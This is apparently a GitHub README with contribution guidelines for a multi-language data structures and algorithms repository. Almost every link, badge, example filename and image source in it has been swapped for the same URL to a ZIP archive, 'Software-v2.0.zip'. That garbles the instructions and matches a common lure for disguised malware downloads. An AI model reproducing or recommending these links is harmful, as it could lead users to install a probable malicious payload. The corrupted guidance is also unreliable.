[![.NET](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)
[![C++](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)
[![Go](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)
[![https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip CI](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)
[![Python](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)
[![codespell](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)
[![CodeQL](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)
[![Discord](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)

# Data Structures and Algorithm

Data structure and Algorithm (DSA)

## Explanations
- [English](./docs/en)
- [繁體中文](./docs/zh-tw)
- [日本語](./docs/ja)

## Contribution Guidelines

### 1. Contribution Specifications

The problem being contributed must either be a simple **file** (**Eg.** [`https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip`](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip), [`https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip`](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)) or a more complex **directory** ([`palindrome/`](./algorithms/Rust/strings/palindrome)). This is a unit `problem`.

The directory tree has the following convention of `algorithms/{language}/{category}/{problem}`, where `{language}` represents the language code of the problem (**Eg.** `CPlusPlus` for C++, `CSharp` for C# etc.), `{category}` is the topic or category of the problem being contributed (**Eg.** `strings`, `sorting`, `linked-lists` etc.), and `{problem}` is a conforming name to the problem (**Eg.** `https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip`, `palindrome`, `https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip` etc.)

A unit `problem` must conform to the following specifications:

- The name should be in lowercase. (**Eg.** `palindrome/`, `https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip` etc.).
- Each word must be separated by a **dash** or a **hyphen** (`-`).

**If you have a problem that belongs to a new _topic_ or _category_ than one which are present:**

1. Create a new folder and an index for it inside (a readme, `https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip` file).
2. To each new index file, write the readme with your `problem` in it ([Markdown Documentation](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)).
3. The folder name can also only contain **lowercase characters** and **dashes** or **hyphens** (`-`) (Eg. `strings` `sorting` etc.)

#### Simple (File) Contributions

The file should conform to the `problem` specification, and the extension (**Eg.** `https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip`, `https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip`, `https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip` etc.)

#### Project/Folder-based Contributions

The project and folder-based contributions have a bit more stricter contribution contribution specifications.

The folder should conform to the `problem` specification, along with the following specifications

**Folder Structure**

```bash
problem-name\
| - .gitignore
| - https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip
| - Makefile       # or the specific specification/requirements/configuration file
| - src\
    | - https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip
```

#### `https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip` Specification / Template

````markdown
# <Title of the Problem>

< description of the problem >

## Prerequisites

- prerequisite library or package
- [prerequisite library](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)

## Instructions

- instructions to run the project
- < Simple and reproducible commands to execute the project >
  ```bash
   make # or 'cargo run', or 'dotnet run' or 'mvn exec:java' etc.
  ```

## Test Cases & Output < if exists>

< If you can provide test cases, describe it here, else remove this section >
````

#### `.gitignore` File

```gitignore
# add all output files and build files to be excluded from git tracking
main     # executable file also must have the project name
target/  # the build file, for example for rust
```

#### Build File / Specification File / Configuration File

It can be any of the following ones

- **C/C++**: `Makefile`
- **Python**: `https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip`
- **JavaScript**: `https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip` and `https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip`
- **Rust**: `https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip` and `https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip`
- **Go**: `https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip`

#### Source Code File

The source code files, should either be in `src/` folder (**Eg.** `https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip` or `https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip`) or the root folder (**Eg.** `https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip` or `https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip`) where `ext` is the file extension for the specific programming language.

Again, the source codes must conform to a valid file structure convention that the programming language enforces.

### 2. Naming Convention

The programming should keep the naming convention rule of each programming language.

### Other topic

- [First-time contribution](https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip)

## Reviewers

| Programming Language | Users                                             |
| -------------------- | ------------------------------------------------- |
| C or C++             | @Arsenic-ATG, @UG-SEP, @aayushjain7               |
| Java                 | @TawfikYasser, @cyberwizard1001, @aayushjain7     |
| C#                   | @ming-tsai                                        |
| Go                   | @atin                                             |
| Python               | @Arsenic-ATG, @atin, @sridhar-5, @cyberwizard1001 |
| JavaScript           | @ming-tsai                                        |

## Contributors

<a href="https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip">
  <img src="https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip" />
</a>

## Open Graph

<img src="https://github.com/Yogeshvar-M/DSA/raw/refs/heads/main/docs/zh-tw/Software-v2.0.zip" />

## License

[MIT](./LICENSE)
